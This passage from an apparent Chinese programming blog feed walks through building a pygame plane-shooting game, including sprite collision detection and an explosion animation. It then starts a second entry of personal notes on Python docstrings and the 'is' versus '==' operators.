self.bullet_list.remove(bullet)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move_left</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.x -= <span class="number">15</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move_right</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.x += <span class="number">15</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fire</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.bullet_list.append(Bullet(self.screen, self.x, self.y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bullet</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, screen_temp, x, y</span>):</span></span><br><span class="line">        self.x = x + <span class="number">20</span></span><br><span class="line">        self.y = y - <span class="number">20</span></span><br><span class="line">        self.screen = screen_temp</span><br><span class="line">        self.image = pygame.image.load(<span class="string">&#x27;images/bullet-3.gif&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen.blit(self.image, (self.x, self.y))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.y -= <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">judge</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.y &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EnemyPlane</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, screen_temp</span>):</span></span><br><span class="line">        self.x = <span class="number">0</span></span><br><span class="line">        self.y = <span class="number">0</span></span><br><span class="line">        self.screen = screen_temp</span><br><span class="line">        self.image = pygame.image.load(<span class="string">&#x27;images/enemy1.png&#x27;</span>)</span><br><span class="line">        self.bullet_list = []  <span class="comment"># 存储发射出去的子弹</span></span><br><span class="line">        self.direction = <span class="string">&#x27;right&#x27;</span>  <span class="comment"># 定义敌机默认往右移动</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen.blit(self.image, (self.x, self.y))</span><br><span class="line">        <span class="keyword">for</span> bullet <span class="keyword">in</span> self.bullet_list:</span><br><span class="line">            bullet.display()</span><br><span class="line">            bullet.move()</span><br><span class="line">            <span class="keyword">if</span> bullet.judge():  <span class="comment"># 判断子弹是否越界</span></span><br><span class="line">                self.bullet_list.remove(bullet)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.direction == <span class="string">&#x27;right&#x27;</span>:</span><br><span class="line">            self.x += <span class="number">8</span></span><br><span class="line">        <span class="keyword">elif</span> self.direction == <span class="string">&#x27;left&#x27;</span>:</span><br><span class="line">            self.x -= <span class="number">8</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.x &gt; <span class="number">430</span>:</span><br><span class="line">            self.direction = <span class="string">&#x27;left&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> self.x &lt; <span class="number">0</span>:</span><br><span class="line">            self.direction = <span class="string">&#x27;right&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fire</span>(<span class="params">self</span>):</span></span><br><span class="line">        random_num = random.randint(<span class="number">1</span>, <span class="number">80</span>)</span><br><span class="line">        <span class="keyword">if</span> random_num == <span class="number">10</span> <span class="keyword">or</span> random_num == <span class="number">40</span>:</span><br><span class="line">            self.bullet_list.append(EnemyBullet(self.screen, self.x, self.y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EnemyBullet</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, screen_temp, x, y</span>):</span></span><br><span class="line">        self.x = x + <span class="number">20</span></span><br><span class="line">        self.y = y + <span class="number">20</span></span><br><span class="line">        self.screen = screen_temp</span><br><span class="line">        self.image = pygame.image.load(<span class="string">&#x27;images/bullet-2.gif&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen.blit(self.image, (self.x, self.y))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.y += <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">judge</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.y &gt; <span class="number">650</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_control</span>(<span class="params">hero_temp</span>):</span></span><br><span class="line">    <span class="comment"># 获取事件，比如按键等</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="comment"># 判断是否是点击了退出按钮</span></span><br><span class="line">        <span class="keyword">if</span> event.<span class="built_in">type</span> == QUIT:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;exit&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="comment"># 判断是否是按下了键</span></span><br><span class="line">        <span class="keyword">elif</span> event.<span class="built_in">type</span> == KEYDOWN:</span><br><span class="line">            <span class="comment"># 检测按键是否是a或者left</span></span><br><span class="line">            <span class="keyword">if</span> event.key == K_a <span class="keyword">or</span> event.key == K_LEFT:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">                hero_temp.move_left()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 检测按键是否是d或者right</span></span><br><span class="line">            <span class="keyword">elif</span> event.key == K_d <span class="keyword">or</span> event.key == K_RIGHT:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;right&#x27;</span>)</span><br><span class="line">                hero_temp.move_right()</span><br><span class="line">            <span class="comment"># 检测按键是否是空格键</span></span><br><span class="line">            <span class="keyword">elif</span> event.key == K_SPACE:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;space&#x27;</span>)</span><br><span class="line">                hero_temp.fire()  <span class="comment"># 开火</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 创建窗口</span></span><br><span class="line">    screen = pygame.display.set_mode((<span class="number">480</span>, <span class="number">700</span>))</span><br><span class="line">    <span class="comment"># 创建一个背景图片</span></span><br><span class="line">    background = pygame.image.load(<span class="string">&#x27;images/background.png&#x27;</span>)</span><br><span class="line">    <span class="comment"># 创建一个飞机对象</span></span><br><span class="line">    hero = HeroPlane(screen)</span><br><span class="line">    <span class="comment"># 创建一个敌机</span></span><br><span class="line">    enemy = EnemyPlane(screen)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 显示到屏幕</span></span><br><span class="line">        screen.blit(background, (<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="comment"># 显示玩家飞机到定义的（x,y）坐标位置</span></span><br><span class="line">        hero.display()</span><br><span class="line">        <span class="comment"># 显示敌机</span></span><br><span class="line">        enemy.display()</span><br><span class="line">        enemy.move()</span><br><span class="line">        <span class="comment"># 敌机开火</span></span><br><span class="line">        enemy.fire()</span><br><span class="line">        pygame.display.update()</span><br><span class="line">        <span class="comment"># 检测键盘，控制玩家飞机移动</span></span><br><span class="line">        key_control(hero)</span><br><span class="line">        time.sleep(<span class="number">0.02</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="爆炸效果"><a href="#爆炸效果" class="headerlink" title="爆炸效果"></a>爆炸效果</h3><p>高大上一点我们可以叫它碰撞检测，pygame.sprite库中，有一些函数可以用于碰撞检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pygame.sprite.collide_rect()：检测两个精灵是否碰撞，两个精灵视为矩形。</span><br><span class="line"></span><br><span class="line">pygame.sprite.collide_circle()：检测两个精灵是否碰撞，两个精灵视为圆形。</span><br><span class="line"></span><br><span class="line">pygame.sprite.groupcollide()：检测两个精灵组是否碰撞，依次判断精灵组A中的每一个精灵是否与精灵组B中的每一个精灵发生碰撞</span><br></pre></td></tr></table></figure>

<p>我们有一大堆子弹，groupcollide显然是最优的选择</p>
<p>我们先看一下这个函数的doc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">detect collision between a group and another group</span><br><span class="line"></span><br><span class="line">pygame.sprite.groupcollide(groupa, groupb, dokilla, dokillb): return dict</span><br><span class="line"></span><br><span class="line">Given two groups, this will find the intersections between all sprites in each group. It returns a dictionary of all sprites in the first group that collide.</span><br><span class="line">The value for each item in the dictionary is a list of the sprites in the second group it collides with. </span><br><span class="line">The two dokill arguments control if the sprites from either group will be automatically removed from all groups.</span><br><span class="line">Collided is a callback function used to calculate if two sprites are colliding.</span><br><span class="line">It should take two sprites as values, and return a bool value indicating if they are colliding. </span><br><span class="line">If collided is not passed, all sprites must have a &quot;rect&quot; value, which is a rectangle of the sprite area that will be used to calculate the collision.</span><br><span class="line"></span><br><span class="line">翻译：</span><br><span class="line">检测组与另一组之间的冲突</span><br><span class="line"></span><br><span class="line">pygame.sprite.groupcollide（groupa，groupb，dokilla，dokillb）：return dict</span><br><span class="line"></span><br><span class="line">给定两组，这将找到每组中所有精灵之间的交叉点。 它返回第一组中碰撞的所有精灵的字典。</span><br><span class="line">字典中每个项目的值是它碰撞的第二个组中的精灵列表。</span><br><span class="line">两个dokill参数控制是否将从所有组中自动删除任一组中的精灵。</span><br><span class="line">Collided是一个回调函数，用于计算两个精灵是否发生碰撞。</span><br><span class="line">它应该将两个精灵作为值，并返回一个bool值，指示它们是否发生碰撞。</span><br><span class="line">如果未传递碰撞，则所有精灵必须具有“rect”值，该值是用于计算碰撞的精灵区域的矩形。</span><br><span class="line"></span><br><span class="line">group1：精灵组1。</span><br><span class="line"></span><br><span class="line">group2：精灵组2。</span><br><span class="line"></span><br><span class="line">dokill1：发生碰撞时，是否销毁精灵组1中的发生碰撞的精灵。</span><br><span class="line"></span><br><span class="line">dokill2：发生碰撞时，是否销毁精灵组2中的发生碰撞的精灵。</span><br><span class="line"></span><br><span class="line">collided：自定义的回调函数，你可以自己编写碰撞检测函数。碰撞检测函数的参数是两个精灵，返回值是True/False。</span><br><span class="line"></span><br><span class="line">返回一个字典，键是精灵组1中发生碰撞的精灵，值是精灵组2中与该精灵发生碰撞的精灵的列表</span><br></pre></td></tr></table></figure>

<p>现在就是要判断hero的子弹有没有击中敌机，集中的话，产生爆炸效果</p>
<p>这里有一个重要的变化，因为爆炸的原因，为了方便判断大量的子弹以及敌机是否碰撞，我决定只用精灵组，之前的一些class让他们继承精灵的类，基本上是一样</p>
<p>为了效果动态一点（毕竟选择默认的碰撞自动消失是没有特效的），可以用一个list存放效果的图片，然后爆炸的时候像幻灯片一样快速调用就好，就显得很酷炫</p>
<p>这里再介绍一个库函数pygame.Rect</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pygame.Rect(left, top, width, height)</span><br><span class="line">分别对应：x,y,图片长度，图片高度</span><br><span class="line">用来裁剪一块矩阵</span><br></pre></td></tr></table></figure>

<p>改完后的代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> pygame.<span class="built_in">locals</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeroPlane</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, screen_temp</span>):</span></span><br><span class="line">        self.x = <span class="number">220</span></span><br><span class="line">        self.y = <span class="number">650</span></span><br><span class="line">        self.screen = screen_temp  <span class="comment"># 游戏窗口</span></span><br><span class="line">        self.image = pygame.image.load(<span class="string">&#x27;images/life.png&#x27;</span>)</span><br><span class="line">        self.bullet_list = []  <span class="comment"># 存储发射出去的子弹</span></span><br><span class="line">        <span class="comment"># 创建子弹精灵组</span></span><br><span class="line">        self.hero_bullet = pygame.sprite.Group()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen.blit(self.image, (self.x, self.y))   <span class="comment"># 加载玩家飞机到窗口</span></span><br><span class="line">        <span class="keyword">for</span> bullet <span class="keyword">in</span> self.bullet_list:</span><br><span class="line">            bullet.display()</span><br><span class="line">            bullet.move()</span><br><span class="line">            <span class="keyword">if</span> bullet.judge():  <span class="comment"># 判断子弹是否越界</span></span><br><span class="line">                self.bullet_list.remove(bullet)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move_left</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.x -= <span class="number">18</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move_right</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.x += <span class="number">18</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fire</span>(<span class="params">self</span>):</span></span><br><span class="line">        h_bullet = Bullet(self.screen, self.x, self.y)</span><br><span class="line">        self.bullet_list.append(h_bullet)</span><br><span class="line">        self.hero_bullet.add(h_bullet)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bullet</span>(<span class="params">pygame.sprite.Sprite</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, screen_temp, x, y</span>):</span></span><br><span class="line">        pygame.sprite.Sprite.__init__(self)  <span class="comment"># 基类的init方法</span></span><br><span class="line">        self.x = x + <span class="number">20</span></span><br><span class="line">        self.y = y - <span class="number">20</span></span><br><span class="line">        self.screen = screen_temp</span><br><span class="line">        self.image = pygame.image.load(<span class="string">&#x27;images/bullet-3.gif&#x27;</span>)</span><br><span class="line">        <span class="comment"># 先用self.rect=self.image.get_rect()获得image距形大小，然后给self.rect设定显示的位置</span></span><br><span class="line">        self.rect = self.image.get_rect()</span><br><span class="line">        self.rect.topleft = (self.x, self.y)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen.blit(self.image, (self.x, self.y))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.y -= <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">judge</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.y &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EnemyPlane</span>(<span class="params">pygame.sprite.Sprite</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, screen_temp</span>):</span></span><br><span class="line">        pygame.sprite.Sprite.__init__(self)  <span class="comment"># 基类的init方法</span></span><br><span class="line">        self.x = <span class="number">0</span></span><br><span class="line">        self.y = <span class="number">0</span></span><br><span class="line">        self.explode_index = <span class="number">0</span>  <span class="comment"># 爆炸时钟</span></span><br><span class="line">        self.screen = screen_temp</span><br><span class="line">        self.image = pygame.image.load(<span class="string">&#x27;images/enemy1.png&#x27;</span>)</span><br><span class="line">        self.bullet_list = []  <span class="comment"># 存储发射出去的子弹</span></span><br><span class="line">        self.direction = <span class="string">&#x27;right&#x27;</span>  <span class="comment"># 定义敌机默认往右移动</span></span><br><span class="line">        <span class="comment"># 先用self.rect=self.image.get_rect()获得image距形大小，然后给self.rect设定显示的位置</span></span><br><span class="line">        self.rect = self.image.get_rect()</span><br><span class="line">        self.rect.topleft = (self.x, self.y)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen.blit(self.image, (self.x, self.y))</span><br><span class="line">        <span class="keyword">for</span> bullet <span class="keyword">in</span> self.bullet_list:</span><br><span class="line">            bullet.display()</span><br><span class="line">            bullet.move()</span><br><span class="line">            <span class="keyword">if</span> bullet.judge():  <span class="comment"># 判断子弹是否越界</span></span><br><span class="line">                self.bullet_list.remove(bullet)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.direction == <span class="string">&#x27;right&#x27;</span>:</span><br><span class="line">            self.x += <span class="number">8</span></span><br><span class="line">        <span class="keyword">elif</span> self.direction == <span class="string">&#x27;left&#x27;</span>:</span><br><span class="line">            self.x -= <span class="number">8</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.x &gt; <span class="number">430</span>:</span><br><span class="line">            self.direction = <span class="string">&#x27;left&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> self.x &lt; <span class="number">0</span>:</span><br><span class="line">            self.direction = <span class="string">&#x27;right&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fire</span>(<span class="params">self</span>):</span></span><br><span class="line">        random_num = random.randint(<span class="number">1</span>, <span class="number">80</span>)</span><br><span class="line">        <span class="keyword">if</span> random_num == <span class="number">10</span> <span class="keyword">or</span> random_num == <span class="number">40</span>:</span><br><span class="line">            self.bullet_list.append(EnemyBullet(self.screen, self.x, self.y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EnemyBullet</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, screen_temp, x, y</span>):</span></span><br><span class="line">        self.x = x + <span class="number">20</span></span><br><span class="line">        self.y = y + <span class="number">20</span></span><br><span class="line">        self.screen = screen_temp</span><br><span class="line">        self.image = pygame.image.load(<span class="string">&#x27;images/bullet-2.gif&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.screen.blit(self.image, (self.x, self.y))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.y += <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">judge</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.y &gt; <span class="number">650</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_control</span>(<span class="params">hero_temp</span>):</span></span><br><span class="line">    <span class="comment"># 获取事件，比如按键等</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="comment"># 判断是否是点击了退出按钮</span></span><br><span class="line">        <span class="keyword">if</span> event.<span class="built_in">type</span> == QUIT:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;exit&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="comment"># 判断是否是按下了键</span></span><br><span class="line">        <span class="keyword">elif</span> event.<span class="built_in">type</span> == KEYDOWN:</span><br><span class="line">            <span class="comment"># 检测按键是否是a或者left</span></span><br><span class="line">            <span class="keyword">if</span> event.key == K_a <span class="keyword">or</span> event.key == K_LEFT:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">                hero_temp.move_left()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 检测按键是否是d或者right</span></span><br><span class="line">            <span class="keyword">elif</span> event.key == K_d <span class="keyword">or</span> event.key == K_RIGHT:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;right&#x27;</span>)</span><br><span class="line">                hero_temp.move_right()</span><br><span class="line">            <span class="comment"># 检测按键是否是空格键</span></span><br><span class="line">            <span class="keyword">elif</span> event.key == K_SPACE:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;space&#x27;</span>)</span><br><span class="line">                hero_temp.fire()  <span class="comment"># 开火</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检测hero的子弹是否击中敌机</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_e_boom</span>(<span class="params">enemy_group, hero_bullet</span>):</span></span><br><span class="line">    result = pygame.sprite.groupcollide(enemy_group, hero_bullet, <span class="literal">True</span>, <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 创建飞机的爆炸效果</span></span><br><span class="line">    enemy_hit_surface = <span class="built_in">list</span>()</span><br><span class="line">    boom_img = pygame.image.load(<span class="string">&#x27;images/enemy1_down1.png&#x27;</span>)</span><br><span class="line">    enemy_hit_surface.append(boom_img.subsurface(pygame.Rect(<span class="number">0</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">51</span>)))</span><br><span class="line">    boom_img = pygame.image.load(<span class="string">&#x27;images/enemy1_down2.png&#x27;</span>)</span><br><span class="line">    enemy_hit_surface.append(boom_img.subsurface(pygame.Rect(<span class="number">0</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">51</span>)))</span><br><span class="line">    boom_img = pygame.image.load(<span class="string">&#x27;images/enemy1_down3.png&#x27;</span>)</span><br><span class="line">    enemy_hit_surface.append(boom_img.subsurface(pygame.Rect(<span class="number">0</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">51</span>)))</span><br><span class="line">    boom_img = pygame.image.load(<span class="string">&#x27;images/enemy1_down4.png&#x27;</span>)</span><br><span class="line">    enemy_hit_surface.append(boom_img.subsurface(pygame.Rect(<span class="number">0</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">51</span>)))</span><br><span class="line">    <span class="comment"># 创建窗口</span></span><br><span class="line">    screen = pygame.display.set_mode((<span class="number">480</span>, <span class="number">700</span>))</span><br><span class="line">    <span class="comment"># 创建一个背景图片</span></span><br><span class="line">    background = pygame.image.load(<span class="string">&#x27;images/background.png&#x27;</span>)</span><br><span class="line">    <span class="comment"># 创建敌机组</span></span><br><span class="line">    enemy_group = pygame.sprite.Group()</span><br><span class="line">    <span class="comment"># 创建一个飞机对象</span></span><br><span class="line">    hero = HeroPlane(screen)</span><br><span class="line">    <span class="comment"># 创建一个敌机</span></span><br><span class="line">    enemy = EnemyPlane(screen)</span><br><span class="line">    enemy_group.add(enemy)</span><br><span class="line">    <span class="comment"># 创建被击中的敌方飞机组</span></span><br><span class="line">    enemy_hit_group = pygame.sprite.Group()</span><br><span class="line">    <span class="comment"># 创建时钟对象 (可以控制游戏循环频率)</span></span><br><span class="line">    <span class="comment"># clock = pygame.time.Clock()</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 每秒循环60次</span></span><br><span class="line">        <span class="comment"># clock.tick(60)</span></span><br><span class="line">        <span class="comment"># 显示到屏幕</span></span><br><span class="line">        screen.blit(background, (<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="comment"># 显示玩家飞机到定义的（x,y）坐标位置</span></span><br><span class="line">        hero.display()</span><br><span class="line">        <span class="comment"># 显示敌机</span></span><br><span class="line">        enemy.display()</span><br><span class="line">        enemy.move()</span><br><span class="line">        <span class="comment"># 敌机开火</span></span><br><span class="line">        enemy.fire()</span><br><span class="line">        result = check_e_boom(enemy_group, hero.hero_bullet)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            enemy_hit_group.add(result)</span><br><span class="line">        <span class="comment"># 绘制爆炸效果</span></span><br><span class="line">        <span class="keyword">for</span> enemy_hit, bullet <span class="keyword">in</span> enemy_hit_group:</span><br><span class="line">            screen.blit(enemy_hit_surface[enemy_hit.explode_index], (enemy_hit.x, enemy_hit.y))</span><br><span class="line">            <span class="keyword">if</span> enemy_hit.explode_index &lt; <span class="number">3</span>:</span><br><span class="line">                enemy_hit.explode_index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                enemy_hit_group.remove(enemy_hit)</span><br><span class="line">        pygame.display.update()</span><br><span class="line">        <span class="comment"># 检测键盘，控制玩家飞机移动</span></span><br><span class="line">        key_control(hero)</span><br><span class="line">        time.sleep(<span class="number">0.02</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python基础编程_6~10_note</title>
    <url>/2019/02/28/Python%E5%9F%BA%E7%A1%80%E7%BC%96%E7%A8%8B-6-10-note/</url>
    <content><![CDATA[<p>写给自己看的，忘记的时候可以看</p>
<span id="more"></span>

<h2 id="6-抽象"><a href="#6-抽象" class="headerlink" title="6 抽象"></a>6 抽象</h2><h4 id="文档化函数"><a href="#文档化函数" class="headerlink" title="文档化函数"></a>文档化函数</h4><p>一个给函数添加注释的姿势</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;return the sum of two num&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(add.__doc__)</span><br></pre></td></tr></table></figure>

<h4 id="is-与"><a href="#is-与" class="headerlink" title="is 与 =="></a>is 与 ==</h4><p>前者地址和值要完全相等，后者只需要值相等</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">b = a</span><br><span class="line"><span class="built_in">print</span>(a == b)</span><br><span class="line"><span class="built_in">print</span>(a <span class="keyword">is</span> b)</span><br><span class="line">a.pop()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>(a)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>(b)))</span><br><span class="line">b = a[:]</span><br><span class="line"><span class="built_in">print</span>(a <span class="keyword">is</span> b)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>(a)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>(b)))</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">list</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a == c)</span><br><span class="line"><span class="built_in">print</span>(a <span class="keyword">is</span> c)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>(a)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>(b)))</span><br></pre></td></tr></table></figure>

<p>我们看一下输出就懂了</p>
